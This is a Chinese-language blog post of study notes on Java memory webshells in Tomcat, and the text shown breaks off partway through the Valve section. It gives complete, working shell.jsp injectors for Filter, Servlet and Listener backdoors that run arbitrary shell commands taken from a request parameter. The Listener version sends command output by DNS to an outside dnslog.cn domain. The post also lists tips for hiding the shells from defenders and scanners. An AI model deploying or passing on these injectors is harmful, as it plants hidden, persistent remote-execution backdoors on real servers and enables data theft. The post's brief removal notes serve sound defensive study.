---
title: Java 内存马原理及利用
description: Java 各类框架下内存马的原理、利用方式与知识框架整理
published: 2026-11-08
tags: [Java安全, 内存马, RCE]
category: 笔记
draft: false
---

# java内存马原理及利用

## 前言

之前学习了python各类框架下的内存马，就想到延伸到java的内存马进行学习，刚好java安全也学习到了这一部分，所以在这里对网上现有文章进行一个学习整理形成一个java内存马的知识框架，便于以后的回看和利用

## 前置知识

### 优点

将恶意逻辑直接注入到目标 Java Web 应用程序的运行时内存中。内存马可以绕过文件监测系统，不易被定位和监控。

### 缺点

服务重启后会失效

对于传统内存马，存在的位置相对固定，已经有相关的查杀技术可以检出。

### java内存马分类

根据内存马的实现技术，大致可以分为如下几类

```
1.中间件系内存马
    •Servlet内存马
    •Filter内存马
    •Listener内存马
    •Tomcat Valve型内存马
    •Tomcat Upgrade内存马
    •Tomcat Executor内存马
    •Netty中间件内存马
```

```
2.框架系内存马
    •SpringMVC框架内存马
    •SpringWebFlux内存马
```

```
3.其他内存马
    •Websocket内存马
    •agent型内存马
```

**中间件型内存马**

中间件（如 Tomcat、WebLogic）是内存马最经典的落脚点。Java Web 中间件通常基于 Servlet 规范，其请求处理流程包含 Listener → Filter → Servlet 等组件链。攻击者若能通过漏洞获取代码执行权限，便可动态注册恶意组件或篡改中间件内部组件。

**框架型内存马**

当应用基于 Spring 等框架开发时，请求处理链路会经过框架自身的组件，因此内存马也可挂载在框架层面。

**其他类型**

- **Java Agent **：利用 JVM 的 Instrumentation 机制，通过 `agentmain` 动态修改已加载类的字节码。例如 Hook `HttpServlet.service` 方法，在正常 Servlet 执行前插入恶意逻辑。这种方式不新增组件，而是修改现有组件的行为，隐蔽性极强，但需要 Agent 文件落地或通过进程注入方式加载。
- **WebSocket 型**：注册恶意的 WebSocket 端点，通过 WebSocket 长连接接收指令。这种方式在流量特征上与普通 WebSocket 通信相似，不易被传统 HTTP 监控发现。

## 基础知识

这一部分内容具体参考[从零掌握java内存马大全（基于LearnJavaMemshellFromZero复现重组）-先知社区](https://xz.aliyun.com/news/18301)的基础知识部分 对tomcat的技术栈  tomcat与spring框架的关系都做了基础的讲解 学习后对后续内存马的理解有很大帮助

这里只**摘录整理**最关键的部分

### Tomcat 容器

Tomcat由四大容器组成，分别是Engine、Host、Context、Wrapper。这四个组件是负责关系，存在包含关系。只包含一个Engine：
**Engine（引擎）**：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。同时，作为一个真正的容器，Engine元素之下可以包含一个或多个虚拟主机。它主要功能是将传入请求委托给适当的虚拟主机处理。如果根据名称没有找到可处理的虚拟主机，那么将根据默认的Host来判断该由哪个虚拟主机处理。
**Host （虚拟主机）**：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是 Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml
**Context（上下文）**：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。
**Wrapper（包装器）**：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。

![image-20261020135526939](/Levi38_blog/images/java-memshell/image-20261020135526939.png)

★假如有用户访问一个 URL，比如图中的http://user.shopping.com:8080/order/buy，Tomcat 如何将这个 URL 定位到一个 Servlet 呢？

 

**1.首先根据协议和端口号确定连接器。**

 

Tomcat 默认的 HTTP 连接器监听 8080 端口、默认的 AJP 连接器监听 8009 端口。上面例子中的 URL 访问的是 8080 端口，因此这个请求会被 HTTP 连接器接收，而一个连接器是属于一个 Service 组件的，这样 Service 组件就确定了。我们还知道一个 Service 组件里除了有多个连接器，还有一个容器组件，具体来说就是一个 Engine 容器，因此 Service 确定了也就意味着 Engine 也确定了。

 

**2.根据域名选定 Host（站点）**

 

Service 和 Engine 确定后，Mapper 组件通过 URL 中的域名去查找相应的 Host 容器，比如例子中的 URL 访问的域名是user.shopping.com，因此 Mapper 会找到 Host2 这个容器。

 

**3.根据 URL 路径找到 Context 组件（Web应用）**

 

Host 确定以后，Mapper 根据 URL 的路径来匹配相应的 Web 应用的路径，比如例子中访问的是 /order，因此找到了 Context4 这个 Context 容器。

 

**4.根据 URL 路径找到 Wrapper（Servlet）**

 

Context 确定后，Mapper 再根据 web.xml 中配置的 Servlet 映射路径来找到具体的 Wrapper 和 Servlet。

![image-20261020135616808](/Levi38_blog/images/java-memshell/image-20261020135616808.png)

## 中间件系内存马

### Filter内存马

#### 什么是Filter

从图片可以看出Filter就是一种过滤器 客户端的请求在经过filter之后才会到Servlet 所以如果我们动态创建一个filter并且将其放在最前面 我们的filter就会最先执行

![image-20261013112756971](/Levi38_blog/images/java-memshell/image-20261013112756971.png)

#### Filter的组件

FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息

 

FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息

 

FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern

 

FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter

 

WebXml：存放 web.xml 中内容的类

 

ContextConfig：Web应用的上下文配置类

  

**StandardContext**：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper



**StandardWrapperValve**：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet

#### 内存马实现

##### 利用环境版本

Tomcat 8.5.100 + JDK 8（8u91）+ war 部署（`javax.servlet.*`）

我们拿一个demo来举例

这个demo模拟的是已经植入jsp后的情景

filter_demo/
  ├── pom.xml                  # war 打包 + maven-war-plugin（无 web.xml 不报错）
  ├── settings.xml             # 阿里云镜像（构建网络问题备用）
  ├── src/main/java/com/example/
  │   ├── MyServlet.java       # /time 业务路由
  │   └── Myfilter.java        # /filter 正常 filter（用来观察链顺序）
  └── src/main/webapp/
      ├── index.jsp
      └── shell.jsp           # 注入入口

**Myfilter.java**

```
package com.example;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;
import java.io.PrintWriter;

@WebFilter("/filter")
public class Myfilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String cmd = servletRequest.getParameter("cmd");
        servletResponse.setCharacterEncoding("UTF-8");
        servletResponse.setContentType("text/html;charset=UTF-8");
        PrintWriter out = servletResponse.getWriter();
        out.println("Myfilter被执行了 cmd = " + cmd);
        System.out.println("Myfilter被执行了 cmd = " + cmd);
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
    }
}
```

**MyServlet.java**

```
package com.example;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

@WebServlet("/time")
public class MyServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String now = sdf.format(new Date());

        resp.setContentType("text/html;charset=UTF-8");
        resp.getWriter().println("<h2>当前时间：" + now + "</h2>");
        resp.getWriter().println("<a href='/'>返回首页</a>");
    }
}
```

**index.jsp**

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>内存马演示 Demo</title>
</head>
<body>
<ul>
    <li><a href="time">查看当前时间（正常 Servlet）</a></li>
    <li><a href="filter">正常 Filter 路由（观察 filter 链顺序）</a></li>
    <li><a href="shell.jsp">注入 Filter 内存马</a></li>
</ul>
</body>
</html>
```

##### **shell.jsp**

```
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>shell</title>
</head>
<body>
<%!
    public static class Shellfilter implements Filter {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
                throws IOException, ServletException {
            String cmd = req.getParameter("cmd");
            if (cmd == null || cmd.isEmpty()) {
                chain.doFilter(req, res);   // 透传，正常业务不受影响
                return;
            }
            boolean isLinux = !System.getProperty("os.name").toLowerCase().contains("win");
            String[] cmds = isLinux
                    ? new String[]{"sh", "-c", cmd}
                    : new String[]{"cmd.exe", "/c", cmd};
            String charset = isLinux ? "UTF-8" : "GBK";   // Windows 控制台默认 GBK
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in, charset).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            res.setContentType("text/html;charset=" + charset);
            res.getWriter().println(output);
            System.out.println("[Shellfilter] cmd=" + cmd + "\n" + output);
        }

        @Override
        public void destroy() {
        }
    }
%>
<%
    // ========== 1. 挖出 StandardContext ==========
    // request.getServletContext() 返回的是门面 ApplicationContextFacade
    //   .context 字段 -> ApplicationContext
    //   .context 字段 -> StandardContext
    ServletContext servletContext = request.getServletContext();
    Field applicationField = servletContext.getClass().getDeclaredField("context");
    applicationField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationField.get(servletContext);

    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    String filterName = "Shellfilter";

    // ========== 2. 先拿 filterConfigs，顺便做幂等判断（防止重复注入）==========
    Field configsField = standardContext.getClass().getDeclaredField("filterConfigs");
    configsField.setAccessible(true);
    Map filterConfigs = (Map) configsField.get(standardContext);
    out.println("<p>注入前 filterConfigs: " + filterConfigs.keySet() + "</p>");
    if (filterConfigs.containsKey(filterName)) {
        out.println("<p>[" + filterName + "] 已存在，跳过注入（幂等保护）</p>");
        return;
    }

    // ========== 3. FilterDef：定义 filter ==========
    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(filterName);
    filterDef.setFilterClass(Shellfilter.class.getName());
    filterDef.setFilter(new Shellfilter());
    standardContext.addFilterDef(filterDef);   // public 方法，直接调

    // ========== 4. ApplicationFilterConfig（构造器 package-private，反射）==========
    Class configClass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
    Constructor configConstructor = configClass.getDeclaredConstructor(Context.class, FilterDef.class);
    configConstructor.setAccessible(true);
    FilterConfig filterConfig = (FilterConfig) configConstructor.newInstance(standardContext, filterDef);
    filterConfigs.put(filterName, filterConfig);

    // ========== 5. FilterMap：URL 映射 ==========
    FilterMap filterMap = new FilterMap();
    filterMap.setFilterName(filterName);
    filterMap.addURLPattern("/*");
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    // addFilterMapBefore：插到 filter 链最前（排在 Myfilter 等已有 filter 之前）
    // 换成 standardContext.addFilterMap(filterMap) 则追加到最后 —— 可对比两种顺序
    standardContext.addFilterMapBefore(filterMap);

    out.println("<p>注入后 filterConfigs: " + filterConfigs.keySet() + "</p>");
    out.println("<p>[" + filterName + "] 注入成功！试试：");
    out.println("<a href='/time?cmd=ipconfig'>/time?cmd=ipconfig</a> | ");
    out.println("<a href='/filter?cmd=ipconfig'>/filter?cmd=ipconfig</a>（观察与 Myfilter 的执行顺序）| ");
    out.println("<a href='/not-exist?cmd=ipconfig'>/not-exist?cmd=ipconfig</a>（404 路径也能触发）</p>");
%>
</body>
</html>
```

我们在正常业务的filter下的doFilter方法下一个断点

查看调用栈，跟进StandardWrapperVavle.invoke()方法可以看到他是根据filterChain来执行filter的

![image-20261020143500856](/Levi38_blog/images/java-memshell/image-20261020143500856.png)

![image-20261020143413028](/Levi38_blog/images/java-memshell/image-20261020143413028.png)

跟进一下filterChain的定义

![image-20261020143706014](/Levi38_blog/images/java-memshell/image-20261020143706014.png)

再下断点跟进后可以看到先调用 getParent() 方法获取StandardContext，再使用findFilterMaps获取filterMaps

![image-20261020143943420](/Levi38_blog/images/java-memshell/image-20261020143943420.png)

filterMaps中的 filterMap 主要存放了过滤器的名字以及作用的 url

![image-20261020144209000](/Levi38_blog/images/java-memshell/image-20261020144209000.png)

接下来会遍历filterMaps 中的 filterMap，如果发现符合当前请求 url 与 filterMap 中的 urlPattern 匹配且通过filterName使用findFilterConfig能找到对应的filterConfig，则会将其加入filterChain

![image-20261020145258108](/Levi38_blog/images/java-memshell/image-20261020145258108.png)

至此filterChain组装完毕，重新回到 StandardContextValue 中，后面会调用 filterChain.doFilter() 方法 最终调用filter.doFilter():

根据上面的调试，我们可以看到最关键的就是StandardContext.findFilterMaps()和StandardContext.findFilterConfig()，这2个方法的实现都是直接从StandardContext中取到对应的属性，那么我们只要往这2个属性里面插入对应的filterMap和filterConfig即可实现



实际上StandardContext也有一些方法可以帮助我们添加属性 对于FilterMap有addFilterMapBefore方法 但是添加前有一个校验

![image-20261022105852962](/Levi38_blog/images/java-memshell/image-20261022105852962.png)

它会根据filterName去寻找对应的filterDef 如果不存在就会抛出异常![image-20261022110041701](/Levi38_blog/images/java-memshell/image-20261022110041701.png)

所以我们还需要往filterDefs里添加filterDef 对于filterDefs，StandardContext直接提供了对应的添加方法

最后我们再来看filterConfigs，根据命名规则搜索addFilterConfig，发现并没有这个方法，所以我们考虑要通过反射的方法手动获取属性并添加

![image-20261022111236150](/Levi38_blog/images/java-memshell/image-20261022111236150.png)

所以现在就可以总结Filter型内存马创建的步骤：

1. 获取StandardContext

2. 继承并编写恶意Filter类
3. 创建一个FilterDef并存放到filterDefs中
4. 创建一个FilterMap类，将我们的 Filter 和 urlpattern 相对应，存放到ilterMaps中
5. 反射获取filterConfigs，创建一个FilterConfig(ApplicationFilterConfig)类，传入StandardContext与filterDefs，存放到filterConfigs中

注入的本质是往请求处理流程的三个固定数据结构里各塞一条自洽的记录。之后每个请求（StandardWrapperValve 组链时）：

  遍历 filterMaps：URL 匹配 /*？→ 命中，记下 filterName "Shellfilter"
      ↓
  filterConfigs.get("Shellfilter") → 拿到第4步塞进去的 FilterConfig
      ↓
  filterConfig.getFilter() → 拿到第3步 setFilter 的那个实例
      ↓
  加入本次请求的 ApplicationFilterChain → doFilter 被调用

![image-20261022142419927](/Levi38_blog/images/java-memshell/image-20261022142419927.png)

![image-20261022142511270](/Levi38_blog/images/java-memshell/image-20261022142511270.png)

![image-20261022142500262](/Levi38_blog/images/java-memshell/image-20261022142500262.png)

注入后 可以看到任何路由都可以执行内存马

并且一开始的正常filter也会先执行 不会覆盖

#### Filter内存马的截断技巧

**ApplicationFilterChain.internalDoFilter** 的逻辑是：链上有个位置指针，每调一次 chain.doFilter()就推进到下一个节点 调或者不调，完全由当前 filter 说了算

所以访问不存在路由的时候 /not-exist?cmd=ipconfig 能回显而不出 404，就是因为写了输出后直接return，请求根本没机会走到 DefaultServlet 去 sendError(404)

#### 提高隐蔽性

通常为了内存马更加隐蔽，需要不影响所有正常的路由从而不易被运维或者安全设备发现

1. 将参数通过header传递 在dofilter获取自定义的特定的header的值作为命令执行的参数
2. 对参数进行编码， 避免明文命令出现在日志、流量包中
3. 对命令执行的回显也进行编码
4. 还可以将回显伪装为json
5. 伪装成静态资源请求，如http://target.com/static/logo.png
6. filter类名伪装，用业务相关名绕过关键字扫描
7. dns外带回显
8. 避免在代码中出现 `"cmd.exe"`、`"sh"`、`"Runtime" `等敏感词

#### 销毁内存马

销毁内存马的本质是破坏挂载点。filter内存马的挂载点是filter链。

filter链在web应用启动时就被创建，而注入内存马是动态加入到filter链，只要重启web应用，filter链就会重新构建，filter内存马也就被销毁了，这只会影响当前web应用。重启tomcat也可，但是会影响别的web应用。



### Servlet内存马

正常 Servlet 通过 `web.xml` 或注解在应用启动时静态注册；而内存马则是攻击者在应用运行期间，Tomcat `StandardContext`的createWrapper()、addChild()、addServletMappingDecoded() 等方法，强行将一个恶意的 `Wrapper`塞进容器中，并绑定一个访问路由

tomcat的四层容器是

Engine → Host → Context → **Wrapper**

Servlet内存马也就是给 Context 这个 Map 里塞一个新Wrapper，里面写马

#### 内存马实现

##### 利用环境版本

Tomcat 8.5.100 + JDK 8（8u91）+ war 部署（`javax.servlet.*`）

注册全程 public API（createWrapper/addChild/addServletMappingDecoded），`addChild` 会经 MapperListener 广播自动进 Mapper，无需反射（8.5.100 源码验证）。

##### shell.jsp

```
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.http.*" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    // Servlet 型内存马本体：有专属 URL（/shell2），response 天然在手，回显三型里最直接。
    // 注意：
    //  - 必须 static（否则哪天不 setServlet 走类名实例化时，非静态内部类没有无参构造，直接炸）
    //  - 不要重写 init(ServletConfig) 却不调 super.init(config)（会丢 ServletConfig）
    public static class Shell2Servlet extends HttpServlet {

        @Override
        public void service(ServletRequest req, ServletResponse res)
                throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd == null || cmd.trim().isEmpty()) {
                res.setContentType("text/html;charset=UTF-8");
                res.getWriter().println("缺少 cmd 参数");
                return;
            }
            boolean isLinux = !System.getProperty("os.name").toLowerCase().contains("win");
            String[] cmds = isLinux
                    ? new String[]{"sh", "-c", cmd}
                    : new String[]{"cmd.exe", "/c", cmd};
            String charset = isLinux ? "UTF-8" : "GBK";   // Windows 控制台默认 GBK
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in, charset).useDelimiter("\\A");   // \\A：输入开头，配 next() 读全量
            String output = s.hasNext() ? s.next() : "";
            res.setContentType("text/html;charset=" + charset);
            PrintWriter out = res.getWriter();
            out.println(output);
            out.flush();
            System.out.println("[Shell2Servlet] cmd=" + cmd);
        }
    }
%>
<%
    // 挖 StandardContext（三型通用起手式）：
    // ApplicationContextFacade --context--> ApplicationContext --context--> StandardContext
    ServletContext servletContext = request.getServletContext();
    Field applicationField = servletContext.getClass().getDeclaredField("context");
    applicationField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationField.get(servletContext);

    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext context = (StandardContext) standardContextField.get(applicationContext);

    String servletName = "Shell2Servlet";
    String urlPattern = "/shell2";

    // 幂等保护：同名 Wrapper 已存在就跳过（addChild 重名会抛 IllegalArgumentException）
    if (context.findChild(servletName) != null) {
        out.println("已存在，跳过注入");
        return;
    }

    // ====== 两件套之一：Wrapper（Servlet 在容器里的登记单元）======
    Wrapper wrapper = context.createWrapper();            // public 工厂方法
    wrapper.setName(servletName);
    wrapper.setServletClass(Shell2Servlet.class.getName());
    wrapper.setServlet(new Shell2Servlet());             // 直接塞实例，跳过类加载实例化
    wrapper.setLoadOnStartup(1);                          // 立即初始化
    context.addChild(wrapper);
    // addChild 会广播 ADD_CHILD 事件，MapperListener 收到后自动把 /shell2 注册进
    // Connector 的 Mapper（源码 MapperListener.containerEvent 149-163 行），
    // 所以【不需要】手动反射改 Mapper —— 下一个请求即可路由

    // ====== 两件套之二：URL 映射 ======
    // Tomcat 8.5/9 用 addServletMappingDecoded；Tomcat 7 用 addServletMapping("/shell2", servletName)
    context.addServletMappingDecoded(urlPattern, servletName, false);

    out.println("注入成功，访问 /shell2?cmd=whoami");
%>
```

![image-20261024195931126](/Levi38_blog/images/java-memshell/image-20261024195931126.png)

注入后 /shell2?cmd=whoami 的完整流程

   浏览器 /shell2?cmd=whoami
  → NIO 线程收到 socket → Http11Processor 解析
  → CoyoteAdapter.service → Mapper 查表：/shell2 命中
  → Engine → Host → Context 管道（先触发 requestListeners——listener 型马的回调就在这）
  → Wrapper（Shell2Servlet 的包装）的 StandardWrapperValve
  → 组 filter 链→ internalDoFilter 走到链尾 → 调 Shell2Servlet.service(ServletRequest, ServletResponse) ← 马体
  → exec + 回显

#### 与filter内存马的区别

对于标准的servlet来说，一个url只能注册一个servlet，所以每个url只会被最后一个注册的servlet所处理 filter则不同，同一个url下的所有filter都会被执行

所以Servlet内存马通常绑定一个所有正常业务URL之外的路径，才不会覆盖正常业务的Servlet从而提高隐蔽性

#### 内存马销毁

前面说到销毁内存马的本质是破坏挂载点。servlet内存马的挂载点是Servlet 容器（`ServletContext`） 。

重新部署war->加载新的`ServletContext`

或者重启tomcat

### Listener内存马

#### 什么是Listener

**Listener（监听器）** 是一种基于**事件驱动**的设计模式实现，用于在某个对象状态发生变化或特定动作发生时，自动通知并执行预先注册的处理逻辑，其实就是类似于flask框架中的钩子函数，我们只要提前注册就能在对象发生变化的时候执行代码。

#### Listener的类型

**ServletContextListener**

监听整个 Web 应用（`ServletContext`）的启动和关闭

- **触发时机**：在 Web 应用初始化开始时触发 `contextInitialized`，在所有 Servlet 和 Filter 销毁后触发 `contextDestroyed`
- 没有 `service()` 方法，无法接收 HTTP 请求参数。

**ServletContextAttributeListener**

监听 `ServletContext`（应用全局作用域）中属性的增、删、改操作

- **触发时机**：当有代码调用 `setAttribute`、`removeAttribute` 或 `replace` 操作全局属性时触发。

**HttpSessionListener**

监听用户 `HttpSession`的创建和销毁。常用于统计在线用户数、记录用户登录/退出审计日志等。

- **触发时机**：会话被创建时触发 `sessionCreated`，会话因超时或调用 `invalidate()` 被销毁时触发 `sessionDestroyed`
- 不适合命令执行类内存马，可用于监控管理员登录（利用权限来执行敏感操作，获取数据）

**ServletRequestListener**

监听单个 `ServletRequest` 的生命周期，即请求进入和离开 Web 应用的作用域。每次请求都会触发。

- **触发时机**：请求即将进入第一个 Servlet/Filter 时触发 `requestInitialized`，请求离开最后一个 Servlet/Filter 时触发 `requestDestroyed`。
- 没有 `ServletResponse`，无法直接回显命令执行结果

####  内存马实现

##### 利用环境版本

Tomcat 8.5.100 + JDK 8（8u91）+ war 部署（`javax.servlet.*`）

回显注意：`ServletRequestEvent` 里没有 response——强转 `connector.Request` 挖 response 是 Tomcat 专属技巧（换容器即失效）；用 DNSLog 外带可规避版本耦合。

要命令执行一般只能使用**ServletRequestListener**

构造的思路和 Filter 马类似，运行时把一个恶意 ServletRequestListener 注册进容器。
  standardContext.addApplicationEventListener(evilListener);   // public 方法

而且事件派发时 getApplicationEventListeners() 每次都从 list 现场取数组，所以运行时注册立刻对下一个请求生效，不需要任何重建步骤

##### shell.jsp

```
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.net.InetAddress" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    // Listener 型内存马本体：requestInitialized 在 StandardHostValve 回调，早于 filter 链；
    // ServletRequestEvent 里拿不到 response，用 DNSLog 外带结果（结果不出现在 HTTP 流量里）
    public static class ShellListener implements ServletRequestListener {

        static final String DNSLOG_DOMAIN = "vrbtw2.dnslog.cn";

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            try {
                String cmd = sre.getServletRequest().getParameter("cmd");
                if (cmd == null || cmd.trim().isEmpty()) {
                    return;   // 无参数：安静旁观，业务无感
                }

                boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
                Process p = Runtime.getRuntime().exec(
                        isWin ? new String[]{"cmd.exe", "/c", cmd}
                              : new String[]{"sh", "-c", cmd});
                Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\A");
                String output = s.hasNext() ? s.next().trim() : "null";

                // 子域名清洗：只取第一行、只留 DNS 合法字符、限长 50（label ≤63）、时间戳防缓存
                if (output.contains("\n")) {
                    output = output.split("\n")[0];
                }
                output = output.replaceAll("[^a-zA-Z0-9._-]", "_");
                if (output.length() > 50) {
                    output = output.substring(0, 50);
                }
                String sub = output + "." + (System.currentTimeMillis() / 1000);

                try {
                    // 这一次 getByName 就是外带本身，解析记录即命令结果
                    InetAddress.getByName(sub + "." + DNSLOG_DOMAIN);
                } catch (Exception ignored) {
                }

                System.out.println("[ShellListener] 外带: " + sub + "." + DNSLOG_DOMAIN);
            } catch (Exception ignored) {
                // 必须静默：StandardHostValve 里 listener 抛异常会中止整个请求
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
%>
<%
    // 挖出 StandardContext：Facade --context--> ApplicationContext --context--> StandardContext
    ServletContext servletContext = request.getServletContext();
    Field applicationField = servletContext.getClass().getDeclaredField("context");
    applicationField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationField.get(servletContext);

    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    // 幂等保护：已注册过就跳过，防止重复注入导致一次请求外带多条
    for (Object listener : standardContext.getApplicationEventListeners()) {
        if (listener instanceof ShellListener) {
            out.println("已存在，跳过注入");
            return;
        }
    }

    // 注册：一个 public 方法搞定（对比 Filter 型的三件套），每请求现场读列表，立即生效
    standardContext.addApplicationEventListener(new ShellListener());
    out.println("注入成功");
%>
```

![image-20261023130541935](/Levi38_blog/images/java-memshell/image-20261023130541935.png)

和filter一样 先取出StandardContext然后把命令结果外传到dnslog中获取结果

ServletRequestListener会监听所有url，包括404，可以通过特殊header，或者特殊路径、伪装静态资源来提高隐蔽性，减少对业务的影响

#### 销毁内存马

前面说到销毁内存马的本质是破坏挂载点

在 Tomcat 中，所有动态注册的 Listener（包括 `ServletContextListener`、`HttpSessionListener`、`ServletRequestListener` 等）都会被存储在：

```
StandardContext.applicationEventListenersList
```

到该数组删除对应的listener

重新部署war

或者重启tomcat



### Valve内存马

#### 什么是 Tomcat Valve

Valve（阀门）是 Tomcat 私有的“容器层责任链”机制，它是 Tomcat给自己内部设计的一条处理链。

Tomcat 使用 Pipeline-Valve 模式 处理请求

```
 Engine 管道  [ …, StandardEngineValve]      
     → Host 管道  [ AccessLog, ErrorReport, StandardHostValve]
         → Context 管道  [ …, StandardContextValve]    Valve 马插这里
             → Wrapper 管道 [ StandardWrapperValve]    
                 → filter 链 → Servlet
```

机制和 FilterChain 是同一种思想，但挂在容器身上而不是 webapp 身上：四层容器，每层一条 Pipeline，pipeline里串一排 Valve，链尾固定一个 basic valve，负责把请求交给下一层容器

#### 内存马实现

##### 利用环境版本

Tomcat 8.5.100 + JDK 8（8u91）+ war 部署（`javax.servlet.*`）

1. 动态创建一个继承 `ValveBase` 的恶意 Valve
2. 获取 Tomcat 的 `StandardContext`
3. 调用 `context.getPipeline().addValve(evilValve)`

##### shell.jsp

```
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.Valve" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    // Valve 型内存马本体。
    //
    // Valve 是 Tomcat 私有的"容器层责任链"（Servlet 规范里没有的东西）：
    //   - Context 管道里加一个 Valve → 在整个 filter 链之前触发（仅晚于 Listener）
    //   - 形参是 Tomcat 内部类型 connector.Request/Response，
    //     但它们 implements HttpServletRequest/Response —— getParameter/getWriter 直接可用
    //   - 透传/截断语义与 Filter 完全同构：调 getNext().invoke() = 放行；不调 = 截断
    public static class ShellValve extends ValveBase {

        @Override
        public void invoke(Request request, Response response)
                throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd != null && !cmd.trim().isEmpty()) {
                try {
                    boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
                    String[] cmds = isWin
                            ? new String[]{"cmd.exe", "/c", cmd}
                            : new String[]{"sh", "-c", cmd};
                    // 合并 stderr（很多命令输出走 stderr，只读 stdout 会静默丢结果）
                    Process p = new ProcessBuilder(cmds).redirectErrorStream(true).start();
                    String charset = isWin ? "GBK" : "UTF-8";   // Windows 控制台默认 GBK
                    Scanner s = new Scanner(p.getInputStream(), charset).useDelimiter("\\A");
                    String output = s.hasNext() ? s.next() : "";
                    response.setContentType("text/html;charset=" + charset);
                    response.getWriter().println(output);
                    System.out.println("[ShellValve] cmd=" + cmd);
